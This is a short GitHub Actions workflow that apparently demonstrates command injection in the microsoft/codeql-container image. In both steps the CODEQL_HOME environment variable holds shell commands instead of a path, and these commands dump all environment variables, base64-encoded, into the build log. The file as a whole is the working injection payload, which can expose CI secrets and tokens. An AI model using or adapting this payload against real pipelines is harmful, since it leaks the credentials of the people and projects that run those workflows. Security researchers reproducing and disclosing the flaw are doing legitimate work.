name: microsoft/codeql-container

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: docker://mcr.microsoft.com/cstsectools/codeql-container
        env:
          CODEQL_HOME: "env | base64 > env.txt; cat env.txt;"
      - uses: docker://mcr.microsoft.com/cstsectools/codeql-container
        env:
          CODEQL_HOME: "env | base64 | base64 -d"
